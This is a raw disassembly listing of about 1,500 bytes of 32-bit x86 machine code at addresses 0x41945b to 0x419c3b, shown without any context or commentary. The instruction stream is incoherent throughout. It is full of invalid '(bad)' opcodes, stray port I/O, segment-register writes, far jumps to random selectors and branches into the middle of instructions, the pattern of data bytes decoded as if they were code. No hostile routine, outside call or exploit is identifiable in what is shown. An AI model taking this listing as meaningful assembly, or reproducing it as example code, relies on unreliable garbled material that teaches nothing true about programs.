  41945b:	or     al,0xa2
  41945d:	or     al,0xfa
  41945f:	stc    
  419460:	dec    ecx
  419461:	pop    eax
  419462:	xlat   BYTE PTR ds:[ebx]
  419463:	mov    ?,edx
  419465:	repz (bad) 
  419467:	xchg   ebp,eax
  419468:	jge    0x4194da
  41946a:	lock push es
  41946c:	or     dh,dl
  41946e:	ss ja  0x419472
  419471:	add    ax,0x14ee
  419475:	fwait
  419476:	inc    esi
  419477:	push   es
  419478:	and    ecx,edx
  41947a:	pop    ebp
  41947b:	adc    BYTE PTR [esi-0x42],0x4c
  41947f:	int3   
  419480:	and    esi,esi
  419482:	cmp    ecx,ecx
  419484:	dec    ebx
  419485:	add    eax,0x99461196
  41948a:	dec    ebx
  41948b:	cwde   
  41948c:	je     0x4194a1
  41948e:	inc    ebx
  41948f:	adc    eax,edi
  419491:	nop
  419492:	cwde   
  419493:	sub    bl,BYTE PTR [ebx-0x10]
  419496:	xchg   ebx,eax
  419497:	inc    edx
  419498:	xor    eax,0x47f4d9c3
  41949d:	push   edx
  41949e:	in     al,0x4d
  4194a0:	xor    eax,0x5c795b0c
  4194a5:	mov    ecx,0xcb8c7c44
  4194aa:	scas   al,BYTE PTR es:[edi]
  4194ab:	or     eax,0xb343a143
  4194b0:	pop    es
  4194b1:	sub    al,0xf8
  4194b3:	fist   DWORD PTR [ecx+0x76e600e8]
  4194b9:	outs   dx,BYTE PTR ds:[esi]
  4194ba:	mov    ch,0xff
  4194bc:	xchg   edi,eax
  4194bd:	push   edx
  4194be:	lahf   
  4194bf:	push   edx
  4194c0:	jbe    0x41945d
  4194c2:	fisubr WORD PTR [edx]
  4194c4:	dec    edx
  4194c5:	je     0x41949c
  4194c7:	jae    0x41950c
  4194c9:	pop    es
  4194ca:	dec    eax
  4194cb:	es loopne 0x419485
  4194ce:	and    eax,0x4162d883
  4194d3:	xchg   edx,eax
  4194d4:	mov    al,0xd3
  4194d6:	retf   0x88d2
  4194d9:	xchg   DWORD PTR [edi-0x3fe27ea5],esi
  4194df:	jmp    0x2ed6b909
  4194e4:	xbegin 0x61815976
  4194ea:	dec    edi
  4194eb:	mov    ah,0x75
  4194ed:	and    dl,BYTE PTR [eax+0x2722aff0]
  4194f3:	adc    BYTE PTR [edi+0x14],0x62
  4194f7:	leave  
  4194f8:	rcl    dh,0xe5
  4194fb:	jne    0x419578
  4194fd:	xchg   ebp,eax
  4194fe:	ror    BYTE PTR [ebx],cl
  419500:	push   ds
  419501:	call   0x1bf7:0xbbd18460
  419508:	js     0x41948c
  41950a:	(bad)  
  41950b:	mov    edi,0x5392c7
  419510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419511:	imul   ecx,DWORD PTR [esi-0x52ef698f],0xffffffd4
  419518:	dec    eax
  419519:	fwait
  41951a:	ds jae 0x41952c
  41951d:	fimul  DWORD PTR [esp+edx*1]
  419520:	aaa    
  419521:	rol    BYTE PTR [ebp-0x6bd54d94],1
  419527:	test   BYTE PTR [ecx+ebx*8-0x77e7681c],bl
  41952e:	ins    DWORD PTR es:[edi],dx
  41952f:	out    dx,al
  419530:	fst    DWORD PTR [ebx*1-0x63f11ef2]
  419537:	push   0xffffffbf
  419539:	lods   eax,DWORD PTR es:[esi]
  41953b:	dec    esi
  41953c:	push   esp
  41953d:	mov    edx,0x2c13349e
  419542:	inc    esi
  419543:	push   0x570cb57b
  419548:	xchg   ebp,eax
  419549:	imul   ecx,DWORD PTR [eax],0x19
  41954c:	mov    WORD PTR [edi+0x72],gs
  41954f:	pop    edx
  419550:	dec    esp
  419551:	(bad)  
  419552:	or     cl,BYTE PTR [ecx]
  419554:	jns    0x41953d
  419556:	out    0xba,eax
  419558:	push   edi
  419559:	cwde   
  41955a:	mov    esp,0xe854e649
  41955f:	jb     0x419526
  419561:	sub    BYTE PTR gs:[ebx],ah
  419564:	fwait
  419565:	sub    al,0x49
  419567:	lea    ebp,[eax-0x478f0b2c]
  41956d:	xor    bl,BYTE PTR ds:0x7754cc92
  419573:	(bad)  
  419574:	mov    cs,edi
  419576:	push   ds
  419577:	mov    ecx,0xf3926714
  41957c:	in     eax,dx
  41957d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41957e:	xor    BYTE PTR [eax+0x2afa05d2],bh
  419584:	sbb    eax,0x85000cbd
  419589:	inc    eax
  41958a:	mov    ch,0xf2
  41958c:	inc    eax
  41958d:	jno    0x419577
  41958f:	push   ss
  419590:	mov    ebx,0xda58d5c6
  419595:	aas    
  419596:	aaa    
  419597:	pop    ds
  419598:	and    al,0xd3
  41959a:	psubusw mm1,QWORD PTR [eax]
  41959d:	mov    ds:0xfa9860b7,al
  4195a2:	push   0xffffffd9
  4195a4:	int    0xe0
  4195a6:	add    al,0x60
  4195a8:	add    eax,0x6b19131a
  4195ad:	cmp    eax,0x65075643
  4195b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b3:	jno    0x419630
  4195b5:	cwde   
  4195b6:	neg    bh
  4195b8:	adc    DWORD PTR [edx+0x1d],0x1d402c5a
  4195bf:	imul   ebp,DWORD PTR [ecx],0xda238f7a
  4195c5:	inc    esp
  4195c6:	aad    0x78
  4195c8:	lahf   
  4195c9:	aad    0xc7
  4195cb:	das    
  4195cc:	ret    0xedcb
  4195cf:	fwait
  4195d0:	repz push ss
  4195d2:	dec    ebp
  4195d3:	loope  0x41962e
  4195d5:	mov    ah,0x97
  4195d7:	aas    
  4195d8:	stos   DWORD PTR es:[edi],eax
  4195d9:	into   
  4195da:	sbb    esi,ebx
  4195dc:	mov    eax,ds:0xe25bcc2c
  4195e1:	test   eax,0x8df1a54b
  4195e6:	jbe    0x419648
  4195e8:	in     eax,0xed
  4195ea:	(bad)  
  4195eb:	mov    eax,0xe6cc975e
  4195f0:	jmp    0xd101:0x5b446d47
  4195f7:	cmc    
  4195f8:	push   ecx
  4195f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195fa:	mov    WORD PTR [eax],?
  4195fc:	imul   esp,ebp,0x48
  4195ff:	and    dh,BYTE PTR [edi+ebp*1]
  419602:	test   eax,0xad090621
  419607:	xor    al,ch
  419609:	in     al,0x89
  41960b:	(bad)  
  41960c:	or     esi,ebp
  41960e:	in     eax,0xe
  419610:	jl     0x419601
  419612:	or     eax,0xd23720ef
  419617:	mov    al,0xcc
  419619:	jns    0x41963c
  41961b:	fmul   DWORD PTR [edx+0xf]
  41961e:	mov    cl,0x7e
  419620:	mov    ebx,0x54bd3932
  419625:	cmc    
  419626:	rcl    DWORD PTR [eax-0x74],1
  419629:	jmp    0x656d:0x714e136a
  419630:	jle    0x41968f
  419632:	imul   edi,DWORD PTR [edi+0x54],0xffffffc9
  419636:	idiv   edi
  419638:	pushf  
  419639:	dec    esp
  41963a:	mov    ds:0xac02e5f7,al
  41963f:	js     0x4195de
  419641:	xchg   esp,eax
  419642:	push   0xfffffff4
  419644:	pop    ds
  419645:	and    edi,DWORD PTR [esi]
  419647:	stos   DWORD PTR es:[edi],eax
  419648:	push   0x49
  41964a:	lea    edi,[esi-0x24]
  41964d:	aam    0xff
  41964f:	sbb    al,0x8e
  419651:	push   esp
  419652:	leave  
  419653:	fnstcw WORD PTR [edi-0x69]
  419656:	xor    eax,0x4b613917
  41965b:	jnp    0x4196ad
  41965d:	mov    dl,0x46
  41965f:	cmp    eax,DWORD PTR [ebx+ebp*2-0x4cfdddb3]
  419666:	out    0x75,eax
  419668:	lea    esi,[ebx-0x1a8a6dda]
  41966e:	cmp    bh,ah
  419670:	mov    bl,0x96
  419672:	adc    ebx,DWORD PTR [ebx+0x40]
  419675:	jbe    0x4196b1
  419677:	xlat   BYTE PTR ds:[ebx]
  419678:	mov    ecx,0xae64aca3
  41967d:	and    DWORD PTR [edi+0x17],ebx
  419680:	in     eax,0x9
  419682:	sub    eax,0xafe9b72b
  419687:	aaa    
  419688:	(bad)  
  41968a:	loope  0x419691
  41968c:	push   ebx
  41968d:	jbe    0x41964b
  41968f:	test   DWORD PTR [edx-0x2f9dbca1],0xf889b800
  419699:	jnp    0x4196b9
  41969b:	sub    al,0xf3
  41969d:	push   es
  41969e:	xchg   edi,eax
  41969f:	pop    ecx
  4196a0:	leave  
  4196a1:	test   BYTE PTR [edx-0x50],0xa6
  4196a5:	adc    BYTE PTR [ebx+ebx*2],bh
  4196a8:	mov    dh,0x0
  4196aa:	pop    ebp
  4196ab:	sub    cl,bh
  4196ad:	ja     0x4196e7
  4196af:	loop   0x419651
  4196b1:	or     al,0x50
  4196b3:	daa    
  4196b4:	je     0x419668
  4196b6:	in     eax,0x1f
  4196b8:	push   esi
  4196b9:	dec    ebx
  4196ba:	xor    dl,0x6
  4196bd:	nop
  4196be:	mov    esi,ebp
  4196c0:	lds    edx,FWORD PTR [esi]
  4196c2:	loopne 0x419737
  4196c4:	dec    ecx
  4196c5:	add    eax,0x45235166
  4196ca:	mov    ecx,0x3c1eb97a
  4196cf:	(bad)  
  4196d0:	fcom   st(3)
  4196d2:	into   
  4196d3:	cli    
  4196d4:	call   0xc234:0x2a8e6222
  4196db:	push   ds
  4196dc:	xlat   BYTE PTR cs:[ebx]
  4196de:	(bad)  
  4196df:	jecxz  0x41972f
  4196e1:	mov    ecx,DWORD PTR [edi+eax*1+0x1aa3ced]
  4196e8:	mov    ah,0x96
  4196ea:	out    dx,eax
  4196eb:	mov    edi,0x5305357a
  4196f0:	mov    ds,WORD PTR [ebx]
  4196f2:	hlt    
  4196f3:	cmc    
  4196f4:	xchg   ebp,eax
  4196f5:	(bad)  [edi]
  4196f7:	inc    ecx
  4196f8:	jne    0x4196ac
  4196fa:	sub    BYTE PTR cs:[eax+0x16],dh
  4196fe:	adc    BYTE PTR [edx+0x76f55a5a],dl
  419704:	mov    cs,esi
  419706:	mov    ds:0x59f8a39e,al
  41970b:	popa   
  41970c:	fs ret 
  41970e:	test   DWORD PTR [ebx+0x10],edi
  419711:	add    BYTE PTR [ebx],0x3c
  419714:	les    ebx,FWORD PTR [ebx+0x254c8914]
  41971a:	in     eax,0xb9
  41971c:	data16 test BYTE PTR [edi],dh
  41971f:	pop    ecx
  419720:	dec    esp
  419721:	in     eax,0xd
  419723:	fcomip st,st(0)
  419725:	aas    
  419726:	mov    ebp,0xac4eab0
  41972b:	mov    esi,0x71001efc
  419730:	dec    edi
  419731:	dec    eax
  419732:	sar    BYTE PTR [edi-0x64],cl
  419735:	rcr    edx,1
  419737:	push   edi
  419738:	aam    0x99
  41973a:	inc    eax
  41973b:	adc    BYTE PTR [edi+eax*1+0x29179cef],dl
  419742:	les    esp,FWORD PTR [esi-0x79]
  419745:	mov    ah,BYTE PTR [eax-0x363330aa]
  41974b:	mov    ch,0xfa
  41974d:	mov    bl,0x7f
  41974f:	aad    0xfd
  419751:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  419753:	dec    edi
  419754:	dec    edi
  419755:	or     BYTE PTR [esi],dl
  419757:	jb     0x419775
  419759:	repnz loopne 0x4197a8
  41975c:	jnp    0x419778
  41975e:	push   cs
  41975f:	cmp    eax,0x1011b273
  419764:	dec    esi
  419765:	fbld   TBYTE PTR [ebx-0x40058596]
  41976b:	xchg   BYTE PTR [ebx+ebp*2-0x49],dl
  41976f:	popf   
  419770:	add    BYTE PTR [ebp+0x1a58581a],ch
  419776:	push   esi
  419777:	call   0x8807e948
  41977c:	xor    esi,DWORD PTR [ecx+0x29]
  41977f:	xchg   DWORD PTR [ebp-0x5f],esi
  419782:	outs   dx,BYTE PTR ds:[esi]
  419783:	sti    
  419784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419785:	mov    DWORD PTR ds:0xd13d6935,edx
  41978b:	and    eax,0x8e9a0219
  419790:	inc    ebx
  419791:	loop   0x41976d
  419793:	test   eax,0x332db01d
  419798:	push   0x75
  41979a:	adc    BYTE PTR [esi],ah
  41979c:	pop    ebp
  41979d:	fstp   QWORD PTR [edi]
  41979f:	dec    ecx
  4197a0:	push   0xffffffe3
  4197a2:	jne    0x41972b
  4197a4:	ja     0x41973f
  4197a6:	(bad)  
  4197a7:	mov    WORD PTR [ebp+0x7993718d],fs
  4197ad:	(bad)  
  4197af:	sub    al,0x8a
  4197b1:	(bad)  
  4197b2:	and    eax,0xc6d38d93
  4197b7:	(bad)
  4197ba:	stos   BYTE PTR es:[edi],al
  4197bb:	rol    BYTE PTR fs:[ebx-0x2632e9e4],1
  4197c2:	sar    DWORD PTR [ecx],1
  4197c4:	arpl   WORD PTR [ebx+ecx*8-0x274d9fb6],di
  4197cb:	mov    esp,DWORD PTR [ecx]
  4197cd:	or     eax,DWORD PTR ss:[edi]
  4197d0:	xor    eax,0x76582eb8
  4197d5:	inc    esi
  4197d6:	adc    eax,0x47740ac7
  4197db:	rcr    DWORD PTR [edx-0x6ee5b7d7],0x11
  4197e2:	sbb    bh,BYTE PTR [eax-0x10]
  4197e5:	inc    ebp
  4197e6:	sbb    DWORD PTR [esp+ebp*2-0x4c],ebp
  4197ea:	adc    DWORD PTR [edi+0x4428bed7],edx
  4197f0:	xlat   BYTE PTR ds:[ebx]
  4197f1:	and    eax,ecx
  4197f3:	sub    al,0x34
  4197f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f6:	pop    esp
  4197f7:	mov    ch,BYTE PTR [eax]
  4197f9:	push   ebp
  4197fa:	stos   DWORD PTR es:[edi],eax
  4197fb:	in     eax,dx
  4197fc:	push   0xed69797f
  419801:	pusha  
  419802:	fwait
  419803:	cmp    edx,ebx
  419805:	push   ebp
  419806:	fcom   DWORD PTR [edx]
  419808:	mov    edx,edi
  41980a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41980b:	jb     0x41986b
  41980d:	(bad)  
  41980e:	jno    0x419869
  419810:	lods   al,BYTE PTR ds:[esi]
  419811:	mov    bh,0xb0
  419813:	in     al,0x77
  419815:	xchg   DWORD PTR [edi-0x17],ebx
  419818:	(bad)  
  419819:	aam    0x23
  41981b:	push   ss
  41981c:	jns    0x419809
  41981e:	xchg   esi,eax
  41981f:	ret    0x49a5
  419822:	adc    DWORD PTR [eax-0x12],esi
  419825:	dec    ebx
  419826:	add    BYTE PTR [eax+0x4f],bl
  419829:	dec    ebx
  41982a:	pop    edx
  41982b:	(bad)  
  41982c:	fs pop es
  41982e:	or     DWORD PTR [edx],eax
  419830:	aaa    
  419831:	cdq    
  419832:	cmp    ah,BYTE PTR [edi]
  419834:	dec    edi
  419835:	push   ds
  419836:	mov    eax,ds:0x6efe7bf2
  41983b:	jge    0x4197d8
  41983d:	jae    0x4197dd
  41983f:	lock jae 0x41980d
  419842:	mov    cl,0xad
  419844:	arpl   si,ax
  419846:	mov    cl,0xb4
  419848:	inc    ecx
  419849:	xchg   BYTE PTR [esi+eiz*4],dl
  41984c:	test   BYTE PTR ds:0xbe8e18b5,dl
  419852:	aaa    
  419853:	pop    ecx
  419854:	stc    
  419855:	imul   DWORD PTR [esi]
  419857:	lock mov eax,ds:0x72b3934e
  41985d:	bts    DWORD PTR [eax-0x2d],eax
  419861:	in     eax,dx
  419862:	arpl   WORD PTR [eax-0x58],di
  419865:	stc    
  419866:	add    al,0x89
  419868:	push   ebx
  419869:	(bad)  
  41986a:	mov    ebx,0x46f027e1
  41986f:	clc    
  419870:	stos   BYTE PTR es:[edi],al
  419871:	mov    ch,0x27
  419873:	jae    0x419827
  419875:	jno    0x419809
  419877:	jbe    0x41980a
  419879:	fwait
  41987a:	ror    DWORD PTR [edx-0x31],1
  41987d:	sub    bh,BYTE PTR [eax-0x74]
  419880:	mov    WORD PTR [ebx-0x210f3b9],es
  419886:	stos   DWORD PTR es:[edi],eax
  419887:	cmp    ecx,ecx
  419889:	or     edx,DWORD PTR [edi-0x3d93a23a]
  41988f:	cs into 
  419891:	test   DWORD PTR [esi],ebx
  419893:	mov    DWORD PTR [edx+0x3418fcdf],eax
  419899:	in     al,dx
  41989a:	out    0x75,al
  41989c:	ins    DWORD PTR es:[edi],dx
  41989d:	jno    0x4198fc
  41989f:	adc    BYTE PTR [ecx-0x65ed7fe3],dl
  4198a5:	inc    esi
  4198a6:	or     eax,0x83b2cf84
  4198ab:	shl    DWORD PTR [edi+eax*4],1
  4198ae:	jo     0x41991a
  4198b0:	mov    eax,ds:0xedde9c2a
  4198b5:	fwait
  4198b6:	cli    
  4198b7:	loopne 0x4198ee
  4198b9:	xchg   esi,eax
  4198ba:	rol    esi,0xa9
  4198bd:	add    eax,DWORD PTR [eax+0x38]
  4198c0:	fdiv   QWORD PTR [esi+0x9]
  4198c3:	xor    eax,0x9a457ded
  4198c8:	test   eax,0x9e24e84
  4198cd:	std    
  4198ce:	rol    DWORD PTR [eax+0x3e],cl
  4198d1:	lea    esp,[ebx+0x57]
  4198d4:	push   ecx
  4198d5:	stos   BYTE PTR es:[edi],al
  4198d6:	mov    ds:0x58ab90fa,al
  4198db:	cmp    cl,BYTE PTR [esp+ebx*1]
  4198de:	jb     0x419945
  4198e0:	rol    DWORD PTR [ebp-0x1d],1
  4198e3:	add    ebx,DWORD PTR [edi+0x44c90705]
  4198e9:	out    dx,al
  4198ea:	pushf  
  4198eb:	pop    es
  4198ec:	and    eax,0x75bebbdf
  4198f1:	ins    BYTE PTR es:[edi],dx
  4198f2:	test   BYTE PTR [ebp+esi*2+0x5a7fc7d2],al
  4198f9:	pop    esi
  4198fa:	pop    edx
  4198fb:	sbb    eax,0xcfddd2f9
  419900:	ret    0x2d6e
  419903:	iret   
  419904:	ds pop esi
  419906:	lea    ebp,[edx+0x9]
  419909:	mov    cl,0x2c
  41990b:	jno    0x4198b8
  41990d:	lods   eax,DWORD PTR ds:[esi]
  41990e:	cdq    
  41990f:	adc    eax,DWORD PTR [eax-0x199c9620]
  419915:	xchg   esi,eax
  419916:	stos   BYTE PTR es:[edi],al
  419917:	sub    DWORD PTR [ebx+0x465f5a89],edi
  41991d:	jl     0x4198cc
  41991f:	in     al,dx
  419920:	and    cl,BYTE PTR [ecx+0x5f]
  419923:	retf   0x8786
  419926:	arpl   WORD PTR [ebx-0x5e],sp
  419929:	test   BYTE PTR [edi-0x31],al
  41992c:	mov    ah,BYTE PTR [ebp-0x34c0c8e7]
  419932:	lods   eax,DWORD PTR ds:[esi]
  419933:	into   
  419934:	mov    ds:0x6a3d0922,eax
  419939:	std    
  41993a:	dec    ebx
  41993b:	inc    dx
  41993d:	fsubp  st(3),st
  41993f:	sbb    bl,BYTE PTR gs:[ebp+edx*1+0x6e74f79c]
  419947:	adc    eax,DWORD PTR [edx+0x23]
  41994a:	fidivr WORD PTR [si-0x42]
  41994e:	pop    ss
  41994f:	push   edx
  419950:	xchg   edi,eax
  419951:	adc    DWORD PTR [eax-0x127c6bdd],edi
  419957:	(bad)  
  419959:	(bad)  
  41995a:	mov    bl,0x24
  41995c:	sub    al,0x5b
  41995e:	std    
  41995f:	rcr    DWORD PTR [esi-0x1d],cl
  419962:	jns    0x419959
  419964:	(bad)  
  419965:	push   eax
  419966:	mov    esi,DWORD PTR [esi-0x42c0367d]
  41996c:	mov    ah,0xaf
  41996e:	push   edx
  41996f:	xchg   ebp,eax
  419970:	inc    edx
  419971:	test   bl,bh
  419973:	shl    ebx,0xcd
  419976:	jo     0x419988
  419978:	loope  0x41991f
  41997a:	hlt    
  41997b:	cmp    esp,eax
  41997d:	mov    ah,0xe4
  41997f:	sahf   
  419980:	gs sub eax,ecx
  419983:	loope  0x419946
  419985:	or     eax,ebx
  419987:	pusha  
  419988:	pop    edi
  419989:	iret   
  41998a:	out    dx,eax
  41998b:	dec    eax
  41998c:	fstp   DWORD PTR [esi+0x45017b97]
  419992:	mov    al,0xf3
  419994:	inc    edx
  419995:	call   0xa62622b3
  41999a:	jmp    0xe671:0xdb085c1c
  4199a1:	pop    edx
  4199a2:	outs   dx,BYTE PTR ds:[esi]
  4199a3:	xchg   ebx,eax
  4199a4:	push   edx
  4199a5:	adc    DWORD PTR ds:0x7f84ff8b,ecx
  4199ab:	call   0x5825:0xc173fa52
  4199b2:	gs cli 
  4199b4:	int3   
  4199b5:	imul   eax,DWORD PTR [esi],0x36db7362
  4199bb:	aam    0x92
  4199bd:	mov    ebx,DWORD PTR [ebx]
  4199bf:	(bad)  
  4199c0:	cmp    bl,BYTE PTR [edx+eiz*8-0x33cee7a3]
  4199c7:	hlt    
  4199c8:	and    al,0x64
  4199ca:	mov    esp,0x43f65096
  4199cf:	jmp    0xab1d51c8
  4199d4:	lock iret 
  4199d6:	pop    ds
  4199d7:	test   al,0x78
  4199d9:	mov    ecx,0x5b986b1b
  4199de:	enter  0x542a,0xdb
  4199e2:	rcl    ebx,0x26
  4199e5:	sbb    edi,DWORD PTR [ecx+0x1e]
  4199e8:	js     0x4199e6
  4199ea:	jl     0x4199d9
  4199ec:	outs   dx,BYTE PTR ds:[esi]
  4199ed:	int    0x52
  4199ef:	data16 mov ah,0xdd
  4199f2:	arpl   di,bx
  4199f4:	pop    ebp
  4199f5:	xchg   ebx,eax
  4199f6:	dec    edi
  4199f7:	or     al,0xc1
  4199f9:	lock and eax,DWORD PTR [ebp+0x16]
  4199fd:	cmp    al,0xb3
  4199ff:	push   0xffffffb1
  419a01:	jnp    0x419a1c
  419a03:	mov    al,0x63
  419a05:	jl     0x4199b2
  419a07:	out    dx,eax
  419a08:	push   es
  419a09:	adc    BYTE PTR ds:0xad089495,al
  419a0f:	cwde   
  419a10:	jns    0x419a56
  419a12:	push   ebp
  419a13:	fisubr WORD PTR [edi+0x6ec8d6e2]
  419a19:	adc    DWORD PTR [ebx+ecx*8],ebp
  419a1c:	ins    BYTE PTR es:[edi],dx
  419a1d:	cmp    al,BYTE PTR [bp+di]
  419a20:	lock inc ecx
  419a22:	cmp    BYTE PTR [eax],cl
  419a24:	sub    dh,BYTE PTR [ecx+0x55]
  419a27:	push   ecx
  419a28:	enter  0xbb80,0x29
  419a2c:	outs   dx,BYTE PTR ds:[esi]
  419a2d:	cdq    
  419a2e:	loope  0x419a2e
  419a30:	retf   0x2c2f
  419a33:	std    
  419a34:	cli    
  419a35:	mov    DWORD PTR [edx-0x25],eax
  419a38:	push   ds
  419a39:	cs and al,0x4b
  419a3c:	iret   
  419a3d:	sbb    BYTE PTR cs:[ebx],0xd9
  419a41:	sti    
  419a42:	fidivr WORD PTR [edx+0x9faecd3]
  419a48:	mov    dh,0x17
  419a4a:	push   ebx
  419a4b:	xchg   ebx,eax
  419a4c:	sahf   
  419a4d:	push   ds
  419a4e:	xor    esp,edx
  419a50:	(bad)  
  419a51:	fsubr  QWORD PTR [esi+0x4f]
  419a54:	dec    eax
  419a55:	scas   al,BYTE PTR es:[edi]
  419a56:	xchg   esi,eax
  419a57:	inc    ebx
  419a58:	pop    edi
  419a59:	sub    ecx,DWORD PTR [edx+0x46f0c2b9]
  419a5f:	ss jae 0x419a31
  419a62:	pop    esi
  419a63:	sub    dl,ah
  419a65:	inc    edi
  419a66:	xor    cl,BYTE PTR [ecx+0x37f1e43e]
  419a6c:	adc    DWORD PTR [edi+0x1],ebp
  419a6f:	ffreep st(7)
  419a71:	dec    ecx
  419a72:	ret    
  419a73:	fist   DWORD PTR [edx-0x4a]
  419a76:	jmp    0x419aec
  419a78:	mov    edx,0xdbd32ca0
  419a7d:	sbb    eax,DWORD PTR [eax+edi*2-0x43]
  419a81:	loopne 0x419a7c
  419a83:	into   
  419a84:	fstp   QWORD PTR [edi+0x78]
  419a87:	mov    ebx,0xd8b69ae0
  419a8c:	xor    BYTE PTR [ebp*2-0x44b283c8],0xbb
  419a94:	xor    BYTE PTR [esi+0x59],dh
  419a97:	cli    
  419a98:	or     ah,BYTE PTR [edi]
  419a9a:	jne    0x419a7f
  419a9c:	stos   BYTE PTR es:[edi],al
  419a9d:	jmp    0x419a71
  419a9f:	add    BYTE PTR [esi+0x69bc160f],bl
  419aa5:	je     0x419a54
  419aa7:	jp     0x419af0
  419aa9:	pop    es
  419aaa:	mov    ecx,0xa98e5203
  419aaf:	imul   ebp,DWORD PTR [ecx+0x41],0x19
  419ab3:	hlt    
  419ab4:	shr    DWORD PTR [ecx+0x3aa0a87c],1
  419aba:	add    eax,0x63cf9eb7
  419abf:	outs   dx,DWORD PTR ds:[esi]
  419ac0:	shl    DWORD PTR ds:0x3e0a495,0xb3
  419ac7:	icebp  
  419ac8:	(bad)  
  419ac9:	mov    bh,0xe
  419acb:	jmp    0xc827:0x18db478a
  419ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad3:	mov    bh,0xdf
  419ad5:	push   edx
  419ad6:	inc    esp
  419ad7:	mov    fs,esp
  419ad9:	inc    eax
  419ada:	and    dl,BYTE PTR [edi]
  419adc:	pop    edx
  419add:	jne    0x419b57
  419adf:	shl    BYTE PTR [eax+0x43ae32a2],1
  419ae5:	es nop
  419ae7:	jmp    0x126132f8
  419aec:	ficomp WORD PTR [eax+0xa0d5499]
  419af2:	sub    bl,BYTE PTR [ebx+0x2acf39ba]
  419af8:	pop    ebx
  419af9:	rcr    DWORD PTR [eax+edi*8],0x3e
  419afd:	push   ds
  419afe:	push   esp
  419aff:	jl     0x419ae8
  419b01:	adc    DWORD PTR [edx+edi*2],ebp
  419b04:	outs   dx,DWORD PTR ds:[esi]
  419b05:	jmp    0xeef4:0x30ed5caa
  419b0c:	std    
  419b0d:	ret    
  419b0e:	rol    DWORD PTR [edi*2-0x37175633],1
  419b15:	push   ebp
  419b16:	out    dx,eax
  419b17:	pusha  
  419b18:	mov    ebx,0xb7b8e077
  419b1d:	(bad)  
  419b1e:	push   0x45
  419b20:	loopne 0x419b23
  419b22:	aas    
  419b23:	and    eax,0xa634010e
  419b28:	fst    DWORD PTR ds:0xfe7d3371
  419b2e:	mov    ds:0x970d6566,al
  419b33:	push   eax
  419b35:	bound  eax,QWORD PTR [ecx]
  419b37:	or     DWORD PTR [eax+0x213753c1],esi
  419b3d:	fild   QWORD PTR ds:0x2ec38957
  419b43:	mov    al,0x31
  419b45:	mov    eax,0xba9660b0
  419b4a:	add    dl,BYTE PTR ds:[ebp-0x7b]
  419b4e:	aad    0x8c
  419b50:	push   edi
  419b51:	dec    esp
  419b52:	jno    0x419b7d
  419b54:	loope  0x419b22
  419b56:	mov    al,ds:0x6aab0d81
  419b5b:	mov    esi,0xb1edd994
  419b60:	rcl    BYTE PTR [ebx+0x21],cl
  419b63:	mov    esp,0x990d79
  419b68:	inc    ecx
  419b69:	outs   dx,DWORD PTR ds:[esi]
  419b6a:	pop    ds
  419b6b:	aad    0x8c
  419b6d:	hlt    
  419b6e:	sbb    DWORD PTR ds:0x1a1f07a3,0xffffff9b
  419b75:	xor    eax,DWORD PTR [ecx+edx*8]
  419b78:	push   esi
  419b79:	add    DWORD PTR ds:0x6e691798,0xf4a10899
  419b83:	adc    eax,0xbea78ff1
  419b88:	push   ds
  419b89:	mov    esi,0xc00ae192
  419b8e:	pop    ecx
  419b8f:	stos   BYTE PTR es:[edi],al
  419b90:	cmp    dl,bl
  419b92:	mov    al,0xd
  419b94:	mov    esi,0xf8b96ea1
  419b99:	aad    0x0
  419b9b:	iret   
  419b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b9d:	mov    ecx,ds
  419b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba0:	ret    0xc677
  419ba3:	cmp    bh,ah
  419ba5:	stos   BYTE PTR es:[edi],al
  419ba6:	inc    edx
  419ba7:	dec    ebp
  419ba8:	int3   
  419ba9:	ror    DWORD PTR ds:0xf00f6df4,1
  419baf:	adc    al,0x64
  419bb1:	gs jg  0x419b4a
  419bb4:	mov    al,ds:0x90bb5875
  419bb9:	shr    DWORD PTR [ebp+0x71],1
  419bbc:	sub    bl,dh
  419bbe:	add    eax,0xd18c3e3
  419bc3:	push   ebp
  419bc4:	shl    DWORD PTR ds:0x7ec933a7,0xbf
  419bcb:	mov    al,ds:0xd6e057b0
  419bd0:	xor    dl,BYTE PTR [edi]
  419bd2:	or     dh,dl
  419bd4:	ja     0x419c03
  419bd6:	inc    edx
  419bd7:	xor    eax,0xbdd2d653
  419bdc:	outs   dx,DWORD PTR ds:[esi]
  419bdd:	push   cs
  419bde:	mov    cl,BYTE PTR [ebx+0x58]
  419be1:	pop    ebp
  419be2:	loopne 0x419bff
  419be4:	popf   
  419be5:	jb     0x419c5a
  419be7:	pop    ds
  419be8:	inc    edi
  419be9:	dec    ebp
  419bea:	push   es
  419beb:	dec    eax
  419bec:	cwde   
  419bed:	xchg   BYTE PTR [edi+0x1b0e5374],dl
  419bf3:	lahf   
  419bf4:	add    eax,0xae7d158c
  419bf9:	jp     0x419b8a
  419bfb:	repz scas al,BYTE PTR es:[edi]
  419bfd:	pop    edi
  419bfe:	mov    ebx,0x1290c7e3
  419c03:	jge    0x419c6d
  419c05:	and    esp,DWORD PTR [edx+0x75197da9]
  419c0b:	idiv   DWORD PTR [ebp+eiz*1+0x58]
  419c0f:	outs   dx,DWORD PTR ds:[esi]
  419c10:	es (bad) 
  419c13:	iret   
  419c14:	out    dx,eax
  419c15:	cmp    BYTE PTR [esi-0x79],dl
  419c18:	sub    DWORD PTR ds:0xf3f5352a,ebx
  419c1e:	daa    
  419c1f:	mov    dl,0x24
  419c21:	xchg   esp,eax
  419c22:	in     eax,dx
  419c23:	test   eax,0xc3d2467
  419c28:	sub    BYTE PTR [ebx-0x79],0xb4
  419c2c:	mov    eax,0xc16dfd2b
  419c31:	scas   al,BYTE PTR es:[edi]
  419c32:	rol    DWORD PTR [edi],1
  419c34:	cld    
  419c35:	sbb    ebx,DWORD PTR [ecx+0x74]
  419c38:	and    DWORD PTR [edx],ebx
  419c3a:	pusha  
  419c3b:	int    0xc6
